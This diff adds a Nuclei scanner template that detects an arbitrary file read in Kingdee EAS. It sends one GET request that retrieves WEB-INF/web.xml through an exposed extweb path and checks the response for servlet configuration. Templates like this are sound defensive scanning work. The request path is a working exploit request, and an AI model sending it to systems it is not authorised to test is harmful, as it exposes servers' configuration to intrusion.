@@ -1,0 +1,36 @@
+id: kingdee-eas-extweb-file-read
+
+info:
+  name: Kingdee EAS extweb Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  description: Kingdee EAS extweb endpoint exposes WEB-INF/web.xml, allowing attackers to obtain servlet configuration and class information.
+  reference:
+    - https://github.com/nu0l/poc-wiki
+  classification:
+    cwe-id: CWE-22
+  metadata:
+    max-request: 1
+  tags: kingdee,file-read,lfi
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/easWebClient/deploy/client/ctrlhome/webapps/extweb/WEB-INF/web.xml"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "web-app"
+          - "<servlet-class>"
+
+      - type: word
+        part: header
+        words:
+          - "text/xml"
